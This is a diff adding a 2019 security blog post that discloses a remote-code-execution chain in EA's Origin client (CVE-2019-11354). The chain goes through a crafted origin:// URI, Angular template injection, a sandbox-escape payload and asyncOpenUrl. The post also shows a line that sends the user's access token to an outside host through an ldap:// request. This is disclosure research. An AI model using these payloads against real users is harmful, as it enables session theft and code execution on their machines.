@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>A Questionable Journey From XSS to RCE :: zero.lol</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Introduction As many of you reading this probably already know, in mid April, a good friend of mine (@Daley) and I located a Remote Code Execution vulnerability in EA&amp;rsquo;s Origin client (CVE-2019-11354). Today I&amp;rsquo;m going to go in depth on how we discovered this vulnerability, along with a couple others we needed to chain along the way ;pp
+
+Debugging Origin A lot of what was discovered was enabled by QtWebEngine debugging." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="/posts/2019-05-13-xss-to-rce/" />
+
+
+
+
+<link rel="stylesheet" href="/assets/style.css">
+
+  <link rel="stylesheet" href="/assets/red.css">
+
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+<link rel="apple-touch-icon" href="/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="/img/favicon/red.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="https://zero.lol" />
+  
+    <meta name="twitter:creator" content="Dominik Penner" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="A Questionable Journey From XSS to RCE">
+<meta property="og:description" content="Introduction As many of you reading this probably already know, in mid April, a good friend of mine (@Daley) and I located a Remote Code Execution vulnerability in EA&amp;rsquo;s Origin client (CVE-2019-11354). Today I&amp;rsquo;m going to go in depth on how we discovered this vulnerability, along with a couple others we needed to chain along the way ;pp
+
+Debugging Origin A lot of what was discovered was enabled by QtWebEngine debugging." />
+<meta property="og:url" content="/posts/2019-05-13-xss-to-rce/" />
+<meta property="og:site_name" content="zero.lol" />
+
+  
+    <meta property="og:image" content="/img/favicon/red.png">
+  
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2019-05-13 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="red">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    zero.lol
+  </div>
+</a>
+
+    </div>
+    
+      <div class="menu-trigger">menu</div>
+    
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="https://twitter.com/zer0pwn">Twitter</a></li>
+        
+      
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="https://twitter.com/zer0pwn">Twitter</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="/posts/2019-05-13-xss-to-rce/">A Questionable Journey From XSS to RCE</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2019-05-13 
+      </span>
+    
+    
+    <span class="post-author">:: Dominik Penner</span>
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="/tags/xss/">xss</a>&nbsp;
+    
+    #<a href="/tags/rce/">rce</a>&nbsp;
+    
+  </span>
+  
+
+  
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="introduction">Introduction<a href="#introduction" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>As many of you reading this probably already know, in mid April, a good friend of mine (@Daley) and I located a Remote Code Execution vulnerability in EA&rsquo;s Origin client (CVE-2019-11354). Today I&rsquo;m going to go in depth on how we discovered this vulnerability, along with a couple others we needed to chain along the way ;pp</p>
+<p><a href="../../assets/calc.gif"><img src="../../assets/calc.gif" alt="" title="Origin RCE"></a></p>
+<h1 id="debugging-origin">Debugging Origin<a href="#debugging-origin" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>A lot of what was discovered was enabled by QtWebEngine debugging. By passing a specific flag to the origin process, we can hook Chrome devtools to the process and inspect the web view.</p>
+<p>In order to set up remote debugging, you have to enable port-forwarding in the chrome devtools. To do this you need to start chrome and open the devtools. From there, open the Remote Devices view, enable port forwarding, and fill in the settings as needed.</p>
+<p>Now we can start the origin process.</p>
+<pre><code>Origin.exe --remote-debugging-port=31337
+</code></pre><p>If you navigate to localhost:31337 in chrome, you&rsquo;ll be met with the devtools, and from there, you can do all the poking around you need.</p>
+<h1 id="origin-uri-handler">Origin URI Handler<a href="#origin-uri-handler" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>URI exploitation isn&rsquo;t new by any means. For a long time it has provided reliable ways of delivering payloads and executing commands on remote computers. The idea of being able to execute remote commands by simply having your target visit a web-page is obviously more than ideal to any threat actor.</p>
+<p>In this scenario, the whole idea behind registering a custom URI handler is for ease-of-access. For example, Origin&rsquo;s handler is mainly there to be able to launch or purchase games from your web-browser. As soon as you click one of those links, your Origin client will launch with the parameters supplied by the crafted URI.</p>
+<p>The Origin URI provides us with a few options we can use. To launch a game, we can use the following URI. This option gives us a few parameters. That&rsquo;s where we&rsquo;ll find our first bug.</p>
+<pre><code>origin://game/launch/?offerIds=OFFERID
+</code></pre><h1 id="the-first-bug-template-injection">The First Bug (Template Injection)<a href="#the-first-bug-template-injection" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>The first bug relies on the fact that when Origin recieves an invalid game ID, it gives you the option to manually add it to your game library. In the dialog that pops up, it also echoes out the title of the game you&rsquo;d like to add. If the game isn&rsquo;t recognized by Origin, how is it supposed to fetch a title, you may be asking. That&rsquo;s where the &ldquo;title&rdquo; parameter comes in handy.</p>
+<p>We can quite literally specify any title we want by simply using the following link:</p>
+<pre><code>origin://game/launch/?offerIds=0&amp;title=zer0pwn
+</code></pre><p>This initially prompted me to try injecting HTML to see if maybe there was a possibility for XSS. You can tell that the HTML is being interpreted when you use the following link:</p>
+<pre><code>origin://game/launch/?offerIds=0&amp;title=&lt;h1&gt;zer0pwn
+</code></pre><p>I figured it would be as simple as injecting script tags to execute javascript, however this was not the case. After a little bit of digging, I discovered that the front-end is primarily developed in Angular. Angular does a lot of stuff with templating, so I figured maybe there was a possibility of template injection. Sure enough, a simple payload of 7*7 got evaluated.</p>
+<pre><code>origin://game/launch/?offerIds=0&amp;title={{7*7}}
+</code></pre><h1 id="the-second-bug-xss">The Second Bug (XSS)<a href="#the-second-bug-xss" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Obviously with a client-side template injection vulnerability, we&rsquo;re limited to executing actions on the client. However, we can leverage this to evaluate our own Javascript and potentially compromise user sessions.</p>
+<p>Angular is notorious for sandboxing, which means that we&rsquo;re going to have to do some funky scripting in order to execute what we want. Thankfully some researchers have already compiled a gist of Angular sandbox-escapes, which is what we used.</p>
+<p>By using the following payload in the title param, we were able to pop an alert box (l33th4x!!!!11)</p>
+<pre><code>{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,alert(l),a')}}
+</code></pre><h1 id="the-third-bug--rce">The Third Bug  (RCE)<a href="#the-third-bug--rce" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Now, this part of the exploit is relatively trivial. QDesktopServices itself isn&rsquo;t necessarily vulnerable here, however the way that Origin has implemented it, on top of the other vulnerabilties, it ended up with a pretty nasty result.</p>
+<p>According to the Qt documentation, &ldquo;The QDesktopServices class provides methods for accessing common desktop services. Many desktop environments provide services that can be used by applications to perform common tasks, such as opening a web page, in a way that is both consistent and takes into account the user&rsquo;s application preferences.&rdquo;</p>
+<p>Now here&rsquo;s the crazy part&hellip; There is actually an SDK (by Origin) in which you can communicate with the client&rsquo;s QDesktopServices via a javascript library. This only works if it&rsquo;s launched within the Origin client (obviously).</p>
+<p>By accessing Origin.client.desktopServices in the DOM, we can find the following functions:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">asyncOpenUrl</span>()<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">asyncOpenUrlWithEADPSSO</span>()<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">deminiaturize</span>()<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">flashIcon</span>()<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">formatBytes</span>()<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getVolumeDiskSpace</span>()<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">isMiniaturized</span>()<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">miniaturize</span>()<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">moveWindowToForeground</span>()<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">setNextWindowUUID</span>()<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">showWindow</span>()<span style="color:#960050;background-color:#1e0010">​</span>
+</code></pre></div><p>Some of these functions are pretty cool. If you call <code>flashIcon()</code>, you&rsquo;ll see the Origin icon flashing (big surprise, right). Most of the functions are pretty self explanatory actually, so I won&rsquo;t bother going into them.</p>
+<p>What we had luck with was <code>asyncOpenUrl()</code>. This function basically calls QDesktopServices <code>openUrl()</code> function, which in turn opens a web browser, or whatever application is registered with the provided URI. According to the documentation, you can also load local resources. Sounds promising, right ;)?</p>
+<p>We can literally open a calculator with the following javascript:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">Origin</span>.<span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">desktopServices</span>.<span style="color:#a6e22e">asyncOpenUrl</span>(<span style="color:#e6db74">&#34;calc.exe&#34;</span>)
+</code></pre></div><h1 id="what-else-can-we-do">What else can we do?<a href="#what-else-can-we-do" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>As I mentioned earlier, Origin has a CSP in place which makes exfiltration somewhat difficult. If we use the <code>ldap://</code> URI handler in conjunction with <code>asyncOpenUrl()</code>, we can send an LDAP request along with the data we want to exfiltrate.</p>
+<pre><code>&quot;ldap://safe.tld/o=&quot;+Origin.user.accessToken()+&quot;,c=UnderDog&quot;
+</code></pre><p>From the server, start tcpdump and set the necessary filters and you should see the data being transmitted in plaintext.</p>
+<p>The <code>Origin.user</code> object contains a bunch of other information as well.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">accessToken</span>()<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">country</span>()<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">dob</span>()<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">email</span>()<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">emailStatus</span>()<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">globalEmailSignup</span>()<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">isAccessTokenExpired</span>()<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">originId</span>()<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">personaId</span>()<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">registrationDate</span>()<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">sessionGUID</span>()<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">showPersona</span>()<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">tfaSignup</span>()<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">underAge</span>()<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">userGUID</span>()<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">userPid</span>()<span style="color:#960050;background-color:#1e0010">​</span>
+<span style="color:#f92672">:</span> <span style="color:#a6e22e">userStatus</span>()
+</code></pre></div><h1 id="wasnt-this-patched">Wasn&rsquo;t this patched?<a href="#wasnt-this-patched" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Electronic Art&rsquo;s rolled out a patch, however there are bypasses available as some on Twitter have decided to share. This highlights the issue once again and should be addressed by sanitizing all types of input, as the initial patch failed to do so.</p>
+<h1 id="references">References<a href="#references" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<ul>
+<li><a href="https://gist.github.com/jeremybuis/38c01acae19fc2ac6959">https://gist.github.com/jeremybuis/38c01acae19fc2ac6959</a></li>
+<li><a href="https://blog.underdogsecurity.com/rce_in_origin_client/">https://blog.underdogsecurity.com/rce_in_origin_client/</a></li>
+<li><a href="https://doc.qt.io/qt-5/qdesktopservices.html">https://doc.qt.io/qt-5/qdesktopservices.html</a></li>
+</ul>
+
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="/posts/2019-05-22-fun-with-uri-handlers/">
+                <span class="button__icon">←</span>
+                <span class="button__text">Fun With Custom URI Schemes</span>
+            </a>
+        </span>
+        
+        
+    </div>
+</div>
+
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2020 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
